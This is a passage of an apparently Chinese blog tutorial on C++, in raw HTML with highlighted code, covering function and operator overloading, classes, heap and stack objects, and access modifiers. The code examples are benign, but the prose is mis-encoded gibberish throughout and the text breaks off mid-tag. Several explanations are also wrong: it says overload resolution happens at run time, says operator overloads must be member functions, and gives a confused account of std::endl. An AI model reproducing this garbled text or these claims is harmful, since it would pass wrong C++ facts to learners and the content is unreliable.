ä¸ºè¿ç®—ç¬¦é‡è½½ï¼Œå§‘ä¸”å¯ä»¥ç†è§£è¿™ä¸ªé‡è½½å°±æ˜¯åˆ†èº«ï¼Œå³åŒä¸€ä¸ªç¬¦å·å¯ä»¥åœ¨ä¸åŒæƒ…å†µä¸‹æœ‰ä¸åŒçš„æ„æ€</p><p>ä»ç®€å•æ¥è¯´ï¼Œå¯ä»¥æŠŠ <code>std::endl</code>çœ‹æˆä¸€ä¸ª <code>\n</code> æ·»åŠ åˆ°å­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œä½†å®é™…ä¸Šå®ƒçš„æœ¬è´¨æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå…·ä½“åŠŸèƒ½æ˜¯åœ¨å­—ç¬¦ä¸²ä¸­å¢åŠ äº†ä¸€ä¸ª <code>\n</code> å¹¶ä¸”è¿˜è°ƒç”¨äº†flushæ¥åˆ·æ–°ç¼“å†²åŒºã€‚é‚£æ—¢ç„¶æ˜¯å‡½æ•°æŒ‡é’ˆï¼Œæ€ä¹ˆè°ƒç”¨çš„æ—¶å€™æ²¡æœ‰åŠ  <code>()</code> å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºè¿™ä¸ªå‡½æ•°æŒ‡é’ˆè¢«é‡è½½è¿ç®—ç¬¦ <code>&lt;&lt;</code> æ‰€åŒ…è£…ï¼Œæˆä¸ºäº†å‡½æ•°å¯¹è±¡ï¼Œåœ¨è°ƒç”¨å‡½æ•°å¯¹è±¡æ—¶ä¸éœ€è¦å†åŠ ä¸Šåœ†æ‹¬å·äº†ï¼Œå› ä¸ºè°ƒç”¨è¿ç®—ç¬¦å·²ç»è¢«é‡è½½äº†ã€‚</p><p>ä¸‹é¢å…ˆæ¥ä»‹ç» C++ ä¸­çš„å‡½æ•°é‡è½½ï¼Œè¿™éœ€è¦å…ˆä»ä¸€ä¸ªé—®é¢˜å¼€å§‹æ€è€ƒ</p><h3 id="std-coutå¦‚ä½•è¯†åˆ«å‚æ•°ç±»å‹"><a href="#std-coutå¦‚ä½•è¯†åˆ«å‚æ•°ç±»å‹" class="headerlink" title="std::coutå¦‚ä½•è¯†åˆ«å‚æ•°ç±»å‹"></a>std::coutå¦‚ä½•è¯†åˆ«å‚æ•°ç±»å‹</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301042011540.png" alt="image-20230104201132267" style="zoom:50%;" /><p>æˆ‘è¿™é‡Œè¾“å‡ºäº†ä¸‰ç§ç±»å‹çš„æ•°æ®ï¼Œåˆ†åˆ«æ˜¯ <code>char *</code> <code>int</code> <code>double</code>ç±»å‹ï¼Œå¹¶ä¸”éƒ½æˆåŠŸçš„è¿›è¡Œäº†è¾“å‡ºï¼Œå¦‚æœæ˜¯Cè¯­è¨€çš„è¯ï¼Œè¿™é‡Œè‚¯å®šæ˜¯ç”¨ <code>printf</code> å‡½æ•°ä¸­çš„ä¸åŒæ ¼å¼åŒ–å­—ç¬¦æ¥åŒ¹é…å¯¹åº”çš„æ•°æ®ï¼Œå¥‡æ€ªçš„æ˜¯åœ¨ C++ ä¸­ï¼Œçœ‹èµ·æ¥ä¸€æ ·çš„è¾“å‡ºè¯­å¥æ€ä¹ˆå¯ä»¥åŒ¹é…ä¸åŒçš„å‚æ•°ç±»å‹å‘¢ï¼Ÿ</p><p>è¿™å°±è¦æåˆ°å‡½æ•°é‡è½½è¿™ä¸ªçŸ¥è¯†ç‚¹äº†ã€‚</p><h4 id="å‡½æ•°é‡è½½"><a href="#å‡½æ•°é‡è½½" class="headerlink" title="å‡½æ•°é‡è½½"></a>å‡½æ•°é‡è½½</h4><p>åœ¨ C++ ä¸­ï¼Œ**å‡½æ•°é‡è½½å…è®¸åœ¨åŒä¸€ä¸ªä½œç”¨åŸŸä¸­å®šä¹‰å¤šä¸ªåŒåå‡½æ•°ï¼Œä¸è¿‡å®ƒä»¬çš„å‚æ•°åˆ—è¡¨éœ€è¦ä¸åŒ(**å‚æ•°ç±»å‹ï¼Œæ•°é‡ï¼Œæˆ–è€…é¡ºåºè‡³å°‘æœ‰ä¸€é¡¹ä¸åŒ)</p><p>ä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type</span><span class="params">(<span class="type">int</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;This is data of type int&quot;</span> &lt;&lt; std::endl; </span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;This is data of type const char *&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type</span><span class="params">(<span class="type">double</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;This is data of type double&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">type</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    <span class="built_in">type</span>(<span class="number">123</span>);</span><br><span class="line"><span class="built_in">type</span>(<span class="number">0.06</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301042053567.png" alt="image-20230104205318468"></p><p>å¯ä»¥å‘ç°æˆ‘å®šä¹‰äº†ä¸‰ä¸ª <code>type</code> å‡½æ•°ï¼Œä»–ä»¬çš„å‡½æ•°åä¸€æ ·ï¼Œä½†æ˜¯å‚æ•°çš„ç±»å‹ä¸ä¸€æ ·ï¼Œè€Œåœ¨mainå‡½æ•°ä¸­è°ƒç”¨äº†ä¸‰æ¬¡ <code>type</code> å‡½æ•°ï¼Œæ ¹æ®ä¼ å…¥çš„å‚æ•°ä¸åŒè°ƒç”¨ç›¸åŒ¹é…çš„é‚£ä¸ªå‡½æ•°æ¥æ‰§è¡Œã€‚<strong>å®ç°åŸç†æ˜¯ç¼–è¯‘å™¨åœ¨ç¼–è¯‘ä»£ç æ—¶æŠŠæ‰€æœ‰å‡½æ•°çš„ç­¾åéƒ½è®°å½•ä¸‹æ¥ï¼Œç„¶ååœ¨è¿è¡Œæ—¶æ ¹æ®å‡½æ•°æä¾›çš„å‚æ•°æ¥é€‰æ‹©æŸä¸ªå‡½æ•°</strong>ã€‚</p><h4 id="è¿ç®—ç¬¦é‡è½½"><a href="#è¿ç®—ç¬¦é‡è½½" class="headerlink" title="è¿ç®—ç¬¦é‡è½½"></a>è¿ç®—ç¬¦é‡è½½</h4><p>ä½†å®é™…ä¸Šå¯¹äº <code>&lt;&lt;</code> è¿˜æ¶‰åŠåˆ°äº†ä¸€ä¸ªé‡è½½è¿ç®—ç¬¦ï¼Œç®€å•æ¥è¯´é‡è½½è¿ç®—ç¬¦æŒ‡çš„æ˜¯æˆ‘ä»¬å¯ä»¥èµ‹äºˆåŸæœ¬è¿ç®—ç¬¦æ–°çš„æ„ä¹‰ï¼Œ<strong>é‡è½½è¿ç®—ç¬¦æœ¬è´¨ä¸Šæ˜¯</strong>å¸¦æœ‰ç‰¹æ®Šåç§°çš„<strong>å‡½æ•°</strong>ï¼Œé‡è½½è¿ç®—ç¬¦å‡½æ•°(ä¹Ÿå°±æ˜¯å‡½æ•°å)ç”±å…³é”®å­— <code>operator</code> å’Œè¦é‡è½½çš„è¿ç®—ç¬¦æ„æˆã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ç°åœ¨åˆ›å»ºäº†ä¸€ä¸ªBoxç±»ï¼Œç„¶åå®ä¾‹åŒ–å¯¹è±¡æ˜¯ä¸€ä¸ª <code>box</code> ï¼Œå…·æœ‰é•¿ï¼Œå®½ï¼Œé«˜çš„å±æ€§ï¼Œæˆ‘ç°åœ¨å¸Œæœ›å°†+é‡è½½ï¼Œä½¿å…¶å¯ä»¥è®©ä¸¤ä¸ªBoxå¯¹è±¡çš„æ¯ä¸ªå±æ€§ç›¸åŠ ã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line"><span class="type">int</span> width;</span><br><span class="line"><span class="type">int</span> height;</span><br><span class="line">Box <span class="keyword">operator</span>+(<span class="type">const</span> Box&amp; box2)</span><br><span class="line">&#123;</span><br><span class="line">Box box3;</span><br><span class="line">box3.length=<span class="keyword">this</span>-&gt;length + box2.length;</span><br><span class="line">box3.width=<span class="keyword">this</span>-&gt;width + box2.width;</span><br><span class="line">box3.height=<span class="keyword">this</span>-&gt;height + box2.height;</span><br><span class="line"><span class="keyword">return</span> box3;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Box box1,box2,box3;</span><br><span class="line">box1.length=<span class="number">1</span>;</span><br><span class="line">box1.width=<span class="number">2</span>;</span><br><span class="line">box1.height=<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">box2.length=<span class="number">10</span>;</span><br><span class="line">box2.width=<span class="number">20</span>;</span><br><span class="line">box2.height=<span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">box3=box1+box2;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The length of the box3 is &quot;</span> &lt;&lt;box3.length &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The width of the box3 is &quot;</span> &lt;&lt; box3.width &lt;&lt;std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The height of the box3 is &quot;</span> &lt;&lt; box3.height &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301042229281.png" alt="image-20230104222911178"></p><p>åœ¨ <code>Box</code> è¿™ä¸ªç±»ä¸­ï¼Œæˆ‘ä»¬ç”¨ <code>operator</code> æŒ‡å®šäº†é‡è½½çš„è¿ç®—ç¬¦ä¸º <code>+</code> ï¼Œè¿™äºŒè€…åˆæˆäº†é‡è½½è¿ç®—ç¬¦å‡½æ•°ï¼Œå‡½æ•°åå‰çš„ä¾ç„¶æ˜¯å‡½æ•°ç±»å‹ï¼Œè€Œåé¢çš„æ‹¬å·é‡Œè£…çš„ä¾ç„¶æ˜¯å‚æ•°ï¼Œçœ‹èµ·æ¥å’Œæ­£å¸¸çš„å‡½æ•°å®šä¹‰ä¸€æ ·ã€‚</p><p>ä½†éœ€è¦æ³¨æ„çš„ä»¥ä¸‹å‡ ç‚¹</p><ol><li>é‡è½½è¿ç®—ç¬¦å‡½æ•°çš„å‚æ•°ï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œ <code>+</code> ä¸¤ä¾§çš„ <code>box1</code> å’Œ<code>box2</code> æ˜¯ä¸¤ä¸ªå‚æ•°ä¼ å…¥ç»™<code>operator+</code> è¿™ä¸ªé‡è½½è¿ç®—ç¬¦å‡½æ•°ï¼Œä½†æ˜¯å®é™…ä¸Šå®šä¹‰çš„åœ°æ–¹ï¼Œä½ å¯ä»¥çœ‹è§æˆ‘å†™ä»£ç ä¸­åªæœ‰ä¸€ä¸ªå‚æ•° <code>box2</code> ï¼Œå®é™…ä¸Šç¬¬ä¸€ä¸ªå¯¹è±¡å·²ç»è¢«å½“åšå‚æ•°è¿›è¡Œäº†ä¼ é€’ï¼Œè¯¥å¯¹è±¡çš„å±æ€§éœ€è¦ç”¨ <code>this</code> è¿ç®—ç¬¦è¿›è¡Œè®¿é—®(å…³äº <code>this</code> æŒ‡é’ˆï¼Œåé¢ä¼šæåˆ°)ã€‚</li><li>è§‚å¯Ÿä¸Šé¢çš„ä»£ç ï¼Œå‘ç°åœ¨é‡è½½è¿ç®—ç¬¦å‡½æ•°çš„å‚æ•°ä¸­ï¼Œå‡ºç°äº† <code>const</code> å’Œ <code>&amp;</code> ï¼Œè¿™æ˜¯å› ä¸ºç¨‹åºä¸ºäº†ä¿è¯æ­£ç¡®æ€§å’Œæ•ˆç‡é‡‡å–çš„æªæ–½ã€‚å…³äº <code>const</code> ,å®ƒæ˜¯<strong>ç”¨æ¥ä¿æŠ¤å‡½æ•°å†…éƒ¨ä¸è¢«æ„å¤–ä¿®æ”¹çš„å¯¹è±¡</strong>ï¼Œä¾‹å¦‚ä½ é‡è½½äº†åŠ æ³•è¿ç®—ç¬¦ï¼Œé‚£ä¹ˆä¸¤ä¸ªå‚æ•°éƒ½åº”è¯¥æ˜¯å¸¸é‡ï¼Œå› ä¸ºå®ƒä»¬åœ¨å‡½æ•°å†…éƒ¨ä¸åº”è¯¥è¢«ä¿®æ”¹ï¼Œæ‰€ä»¥åŠ ä¸Š <code>const</code> ä¹Ÿå°±æ˜¯è¯´ä½ çš„å‡½æ•°ä¸ä¼šä¿®æ”¹ç±»å†…çš„ä»»ä½•æˆå‘˜å˜é‡ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†å‡½æ•°å£°æ˜ä¸º <code>const</code> ç±»å‹ã€‚å…³äº**<code>&amp;</code> ,å®ƒæ˜¯ç”¨æ¥é¿å…æ‹·è´å¯¹è±¡çš„å¼€é”€çš„<strong>ï¼Œæåˆ°è¿™é‡Œå°±ä¸å¾—ä¸è¯´</strong>åœ¨ C++ ä¸­å¦‚æœå‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆè°ƒç”¨å‡½æ•°æ—¶ä¼šè¿›è¡Œå¯¹è±¡çš„æ‹·è´**ï¼Œè€Œå¦‚æœåŠ ä¸Š <code>&amp;</code>å¼•ç”¨çš„è¯ï¼Œå°±å¯ä»¥é¿å…æ‹·è´å¯¹è±¡é€ æˆçš„å¼€é”€ï¼Œæå‡äº†ç¨‹åºçš„æ•ˆç‡ã€‚ä½†æ˜¯ä¸åŠ  <code>&amp;</code> çš„è¯ï¼Œä¹Ÿæœ‰ä¸€äº›ä¼˜ç‚¹ï¼Œæ¯”å¦‚æ‹·è´å¯¹è±¡çš„è¯ï¼Œå‡½æ•°å†…éƒ¨å¯¹å¯¹è±¡çš„ä¿®æ”¹ä¸ä¼šå½±å“åŸæ¥çš„å¯¹è±¡</li><li><strong>é‡è½½è¿ç®—ç¬¦å‡½æ•°å¿…é¡»æ˜¯ç±»çš„æˆå‘˜å‡½æ•°</strong>ï¼Œä¹Ÿå°±æ˜¯ä½ æƒ³é‡è½½ä¸€ä¸ªè¿ç®—ç¬¦ï¼Œå°±å¿…é¡»è¦å®šä¹‰ä¸€ä¸ªç±»ï¼Œç„¶ååœ¨ç±»çš„å†…éƒ¨å®šä¹‰é‡è½½è¿ç®—ç¬¦å‡½æ•°ã€‚</li></ol><p>å› æ­¤æ ¹æ®ä¸Šé¢çš„å†…å®¹ï¼Œå°±å¯ä»¥åˆ†æå‡ºæ¥std::cout &lt;&lt;å®é™…ä¸Šæ˜¯è°ƒç”¨äº†è¿ç®—ç¬¦é‡è½½å‡½æ•° <code>cout.operator &lt;&lt; ()</code> ï¼Œæ ¹æ®ä¼ å…¥çš„ä¸åŒå‚æ•°ç±»å‹ï¼Œè°ƒç”¨ç›¸åŒ¹é…çš„é‡è½½å‡½æ•°ã€‚</p><h3 id="ç±»ä¸å¯¹è±¡"><a href="#ç±»ä¸å¯¹è±¡" class="headerlink" title="ç±»ä¸å¯¹è±¡"></a>ç±»ä¸å¯¹è±¡</h3><p>ç¬”è®°æœ¬ç”µè„‘å’Œå°å¼ç”µè„‘éƒ½å±äºè®¡ç®—æœºï¼Œè®¡ç®—æœºæœ‰çš„åŸºæœ¬å±æ€§ï¼Œç¬”è®°æœ¬å’Œå°å¼è‚¯å®šéƒ½æœ‰ã€‚å‡è®¾ç°åœ¨æœ‰ä¸€ä¸ªä»»åŠ¡æ˜¯è¦è®°å½•è®¡ç®—æœºçš„åŸºç¡€é…ç½®ï¼Œå¹¶ä¸”åœ¨ä¹‹åä¸€æ®µæ—¶é—´è¿˜éœ€è¦è®°å½•å°å¼ç”µè„‘çš„é…ç½®å’Œç¬”è®°æœ¬ç”µè„‘çš„é…ç½®ï¼Œæˆ‘ä»¬å¯ä»¥æ€ä¹ˆåšï¼Œå†™ä¸€ä¸ªç»“æ„ä½“ï¼Œæ¥è®°å½•è®¡ç®—æœºçš„é…ç½®ï¼Ÿç„¶åç­‰åˆ°å°å¼å°±å†å†™ä¸€ä¸ªç»“æ„ä½“ï¼Ÿå¦‚æœéœ€è¦å†™æŸä¸ªç‰Œå­çš„ç¬”è®°æœ¬ç”µè„‘çš„ä¿¡æ¯å°±å†å†™Nä¸ªï¼Ÿ(å®é™…ä¸Šè¿™æ˜¯ä¸ªå¾ˆç³Ÿç³•çš„ä¾‹å­,hhh)</p><p>ä¸ä¸ä¸ï¼Œä½ å¯èƒ½å·²ç»çŒœåˆ°æˆ‘æƒ³ç”¨ä»€ä¹ˆäº†ï¼Œæ²¡é”™ï¼Œå°±æ˜¯ç”¨ç±»ä¸å¯¹è±¡çš„æ¦‚å¿µæ¥å®ç°ä¸Šè¿°è¿™ä¸ªé—®é¢˜ã€‚</p><p>ç°åœ¨æŠ›å¼€ä¹‹åçš„ä»»åŠ¡ï¼Œåªè®°å½•è®¡ç®—æœºçš„åŸºæœ¬ä¿¡æ¯ï¼Œå¹¶ä¸”å°†å…¶å®ä¾‹åŒ–æˆä¸€ä¸ªä¸ªçš„å¯¹è±¡(ä½ å¯ä»¥å°†è¿™ä¸ªå®ä¾‹åŒ–çš„è¿‡ç¨‹ç†è§£ä¸ºå°†ä¸€ä¸ªæŠ½è±¡çš„è®¡ç®—æœºé…ç½®çªç„¶å®ä¾‹æˆæŸä¸ªå…·ä½“å“ç‰Œçš„è®¡ç®—æœº)</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œè®¡ç®—æœºéƒ½å…·æœ‰ç¡¬ç›˜ï¼Œå†…å­˜ï¼ŒCPUï¼Œæ˜¾å¡ï¼ŒIOè®¾å¤‡ç­‰ç­‰ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿™ä¹ˆå®šä¹‰ä¸€ä¸ªè®¡ç®—æœºç±»ï¼Œä»£ç å¦‚ä¸‹</p><p>æ­¤å¤„çš„å„ä¸ªå±æ€§éƒ½æ˜¯æˆ‘éšä¾¿å†™çš„ï¼Œç†è§£æ„æ€å°±å¥½ï¼Œä¸æ˜¯çœŸçš„è¦ä»‹ç»å„ä¸ªç¡¬ä»¶çš„ä¿¡æ¯ã€‚</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Computer</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> Hard_disk;</span><br><span class="line"><span class="type">int</span> Memory;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *CPU;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *Video_card;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *IO;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Computer Lenovo;</span><br><span class="line">Lenovo.Hard_disk=<span class="number">128</span>;</span><br><span class="line">Lenovo.Memory=<span class="number">8</span>;</span><br><span class="line">Lenovo.CPU=<span class="string">&quot;xxx-1&quot;</span>;</span><br><span class="line">Lenovo.Video_card=<span class="string">&quot;ttt-1&quot;</span>;</span><br><span class="line">Lenovo.IO=<span class="string">&quot;uuu-1&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The Hard disk is &quot;</span> &lt;&lt; Lenovo.Hard_disk &lt;&lt; <span class="string">&quot;G&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The Memory is &quot;</span> &lt;&lt; Lenovo.Memory &lt;&lt; <span class="string">&quot;G&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The CPU is &quot;</span> &lt;&lt; Lenovo.CPU &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The Video_card is &quot;</span> &lt;&lt; Lenovo.Video_card &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The IO is &quot;</span> &lt;&lt; Lenovo.IO &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301050013916.png" alt="image-20230105001321846"></p><p>ä¸Šè¿°ä»£ç å®šä¹‰äº†ä¸€ä¸ª <code>Computer</code> ç±»ï¼Œç„¶åå®ä¾‹åŒ–çš„å¯¹è±¡ä¸º <code>Lenovo</code> ï¼Œå¯¹å…¶æ‰€æœ‰å±æ€§éƒ½è¿›è¡Œäº†åˆå§‹åŒ–ã€‚è¯­æ³•å¾ˆç®€å•ï¼Œæ­¤å¤„ä»£ç ä¸»è¦è®²ä¸¤ä¸ªç‚¹ã€‚ç¬¬ä¸€å°±æ˜¯å®ä¾‹åŒ–åçš„å¯¹è±¡åœ¨å“ªé‡Œï¼Ÿç¬¬äºŒä¸ªå°±æ˜¯ç±»ä¸­æœ‰ä¸€ä¸ª <code>public</code> ï¼Œè¿™ä¸ªæ˜¯å¹²å•¥çš„ï¼Ÿ</p><h4 id="ç±»å®ä¾‹åŒ–åçš„å¯¹è±¡å­˜æ”¾åˆ°å“ªé‡Œï¼Ÿ"><a href="#ç±»å®ä¾‹åŒ–åçš„å¯¹è±¡å­˜æ”¾åˆ°å“ªé‡Œï¼Ÿ" class="headerlink" title="ç±»å®ä¾‹åŒ–åçš„å¯¹è±¡å­˜æ”¾åˆ°å“ªé‡Œï¼Ÿ"></a>ç±»å®ä¾‹åŒ–åçš„å¯¹è±¡å­˜æ”¾åˆ°å“ªé‡Œï¼Ÿ</h4><p>å®ä¾‹åŒ–åçš„å¯¹è±¡æœ‰ä¸¤ç§å­˜å‚¨ä½ç½®ï¼Œåˆ†åˆ«æ˜¯æ ˆå’Œå †ã€‚</p><p>ä¸Šé¢çš„ä»£ç ä¸­ï¼Œå› ä¸ºå‡½æ•°å†…çš„å±€éƒ¨å˜é‡æ˜¯ä½äºæ ˆä¸Šï¼Œè€Œ <code>Lenovo</code> æ˜¯mainå‡½æ•°çš„å±€éƒ¨å˜é‡ï¼Œæ‰€ä»¥ <code>Lenovo</code> è¿™ä¸ªå¯¹è±¡ä½äºæ ˆä¸Šã€‚</p><p>å¦‚æœä¸»åŠ¨ä½¿ç”¨äº† <code>new</code> å‡½æ•°æ¥åˆ†é…å†…å­˜ç»™å®ä¾‹åŒ–åçš„å¯¹è±¡ï¼Œé‚£ä¹ˆè¯¥å¯¹è±¡çš„å†…å­˜å°±ä¼šä½äºå †ä¸Šï¼Œå°†ä¸Šé¢çš„ä»£ç åšå¦‚ä¸‹ä¿®æ”¹ï¼Œå³å¯è®©å…¶ä½äºå †ä¸Šï¼Œä¸å†ä½¿ç”¨è¯¥å¯¹è±¡çš„æ—¶å€™éœ€è¦æ‰‹åŠ¨è°ƒç”¨ <code>delete</code> è¿›è¡Œé”€æ¯ï¼Œé¿å…å†…å­˜æ³„éœ²çš„é—®é¢˜</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Computer *Lenovo = <span class="keyword">new</span> Computer;</span><br><span class="line">Lenovo-&gt;Hard_disk = <span class="number">128</span>;</span><br><span class="line">Lenovo-&gt;Memory = <span class="number">8</span>;</span><br><span class="line">Lenovo-&gt;CPU = <span class="string">&quot;xxx-1&quot;</span>;</span><br><span class="line">Lenovo-&gt;Video_card = <span class="string">&quot;ttt-1&quot;</span>;</span><br><span class="line">Lenovo-&gt;IO = <span class="string">&quot;uuu-1&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="ç±»è®¿é—®ä¿®é¥°ç¬¦-amp-amp-æ•°æ®å°è£…"><a href="#ç±»è®¿é—®ä¿®é¥°ç¬¦-amp-amp-æ•°æ®å°è£…" class="headerlink" title="ç±»è®¿é—®ä¿®é¥°ç¬¦&amp;&amp;æ•°æ®å°è£…"></a>ç±»è®¿é—®ä¿®é¥°ç¬¦&amp;&amp;æ•°æ®å°è£…</h4><p>å…³é”®å­—  <code>public</code> <code> private</code> <code>protected</code> æˆä¸ºè®¿é—®ä¿®é¥°ç¬¦ï¼Œå®ƒä»¬æ ‡è®°çš„åŒºåŸŸå†…å¯ä»¥è®¾ç½®æˆå‘˜å˜é‡çš„è®¿é—®å±æ€§ï¼Œæ¯”å¦‚ä¸Šé¢çš„ä¾‹å­é‡Œï¼Œåœ¨mainå‡½æ•°ä¸­æˆ‘å¯¹ <code>Lenovo</code> å¯¹è±¡ä¸­çš„ <code>Memory</code> æˆå‘˜è¿›è¡Œäº†èµ‹å€¼ä¸º <code>8</code> çš„æ“ä½œï¼Œä¹‹æ‰€ä»¥èƒ½å¤Ÿè¿™æ ·ç›´æ¥èµ‹å€¼æ˜¯å› ä¸ºæˆ‘å°†å…¶å®šä¹‰ä¸ºäº†å…¬æœ‰ï¼ˆ<code> public</code> ï¼‰æˆå‘˜ï¼Œè¿™å°±æ„å‘³è¿™æˆ‘ç”¨ <code>.</code> å¯ä»¥ç›´æ¥è®¿é—®å…¬æœ‰æˆå‘˜ï¼Œä½†å¦‚æœæˆ‘å°†æˆå‘˜è®¾ç½®ä¸ºç§æœ‰ï¼ˆ <code>private</code> ï¼‰æˆå‘˜å°±æ— æ³•è¿™æ ·ç›´æ¥è®¿é—®äº†ï¼Œæ­£å¦‚åŒä¸‹é¢çš„ä»£ç ä¸€æ ·</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Box box;</span><br><span class="line">box.length=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051616143.png" alt="image-20230105161601838"></p><p>å¯ä»¥çœ‹åˆ°ç¼–è¯‘æ˜¯ç»™äº†ä¸€ä¸ª <code>error</code> æç¤ºè¯´ <code>Box::length</code> è¿™ä¸ªæˆå‘˜æ˜¯ç§æœ‰çš„ï¼Œæ‰€ä»¥è¿™é‡Œæ— æ³•èµ‹å€¼ã€‚</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥å°†ä»£ç æ”¹æˆä¸‹é¢è¿™æ ·,é€šè¿‡å…¬æœ‰çš„æˆå‘˜å‡½æ•°æ¥è®¿é—®ç§æœ‰çš„æˆå‘˜ï¼ˆ<strong>æ‰€è°“çš„ç§æœ‰æˆå‘˜æŒ‡çš„æ˜¯åªèƒ½åœ¨ç±»çš„å†…éƒ¨è¢«è®¿é—®ï¼Œè€Œæ— æ³•åœ¨å¤–éƒ¨è¿›è¡Œè®¿é—®</strong>ï¼‰ï¼Œè€Œå…¬æœ‰çš„æˆå‘˜å‡½æ•°ï¼ˆåœ¨ç±»å†…å£°æ˜æˆ–å®šä¹‰çš„å‡½æ•°ï¼‰è‡ªç„¶æ˜¯èƒ½å¤Ÿè¢«å¤–éƒ¨è®¿é—®ã€‚</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span 